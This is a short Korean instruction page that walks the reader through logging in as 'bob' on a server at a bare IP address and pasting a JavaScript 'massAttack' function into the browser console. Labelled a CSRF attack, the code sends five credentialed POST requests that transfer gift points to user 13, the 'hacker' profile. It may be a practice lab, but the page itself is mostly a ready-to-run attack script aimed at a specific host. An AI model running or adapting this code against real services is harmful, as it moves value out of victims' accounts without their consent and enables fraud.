⚠️ CORS 우회 방법

GitHub Pages에서는 CORS 때문에 막힙니다.
직접 실행 방식을 사용하세요!

🎯 Step 1: bob 계정으로 로그인

먼저 새 탭에서 http://3.36.66.216에 bob으로 로그인하세요.

⌨️ Step 2: 개발자 도구 열기

F12 또는 Cmd+Option+I로 개발자 도구를 여세요.

🔥 Step 3: Console에서 실행

아래 코드를 Console 탭에 복사해서 실행하세요:

// 🎯 CSRF 공격 함수 async function massAttack() { console.log('🔥 대량 CSRF 공격 시작!'); const attacks = [ {points: 100, msg: 'attack1', type: 'coffee'}, {points: 150, msg: 'attack2', type: 'flower'}, {points: 200, msg: 'attack3', type: 'cake'}, {points: 250, msg: 'attack4', type: 'diamond'}, {points: 300, msg: 'attack5', type: 'coffee'} ]; let total = 0; for (let i = 0; i < attacks.length; i++) { const attack = attacks[i]; try { const response = await fetch('http://3.36.66.216/profile.php?gift_to=13', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', }, body: `send_gift=1&receiver_id=13&gift_type=${attack.type}&points=${attack.points}&message=${attack.msg}`, credentials: 'include' }); console.log(`✅ 공격 ${i+1}: ${attack.points}P → 응답 ${response.status}`); total += attack.points; } catch (error) { console.log(`❌ 공격 ${i+1} 실패:`, error.message); } // 2초 대기 if (i < attacks.length - 1) { console.log(`⏳ ${i+1}/${attacks.length} 완료, 2초 대기...`); await new Promise(resolve => setTimeout(resolve, 2000)); } } console.log(`🎉 공격 완료! 총 ${total}P 전송 시도됨`); console.log('🔍 hacker 프로필 확인: http://3.36.66.216/profile.php?user_id=13'); } // 실행 massAttack();
